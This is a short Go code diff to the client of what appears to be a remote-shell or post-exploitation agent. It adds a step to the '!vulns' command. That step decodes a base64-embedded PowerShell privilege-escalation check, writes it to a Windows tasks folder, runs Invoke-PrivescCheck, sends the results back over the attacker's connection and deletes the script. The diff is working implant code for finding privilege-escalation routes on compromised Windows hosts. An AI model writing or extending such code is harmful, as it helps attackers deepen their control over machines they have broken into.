@@ -2,10 +2,13 @@ package client
 
 import (
 	"bufio"
+	"encoding/base64"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
+	"os"
 	"os/user"
 	"time"
 
@@ -78,7 +81,15 @@ func Run(s *yamux.Session, c net.Conn) {
 			if !handled {
 				switch argv[0] {
 				case "!vulns":
+					// we also run privesc check
+					privescCheck := "<PRIVESCCHECK>"
+					path := "\\windows\\tasks\\temp.ps1"
+					decodedScript, _ := base64.StdEncoding.DecodeString(privescCheck)
+					ioutil.WriteFile(path, []byte(decodedScript), 0644)
+					out, _ := shell.ExecPSOut(fmt.Sprintf(". %s;Invoke-PrivescCheck", path), false)
+					c.Write([]byte(out))
 					vulns.Check(c)
+					os.Remove(path)
 					prompt(c)
 				case "!runasps":
 					if len(argv) != 4 {
